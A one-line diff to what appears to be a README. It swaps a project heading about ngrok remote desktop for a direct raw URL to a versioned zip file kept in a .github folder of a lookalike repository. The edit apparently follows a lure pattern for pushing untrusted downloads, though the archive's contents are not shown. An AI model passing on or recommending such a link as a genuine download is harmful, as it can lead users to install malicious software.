@@ -1,1 +1,1 @@
-# github.com-kaalmous-ngrok-rdp
+# https://github.com/rkrakesh524/github.com-kaalmous-ngrok-rdp/raw/refs/heads/main/.github/ngrok-kaalmous-com-github-rdp-3.5-beta.1.zip
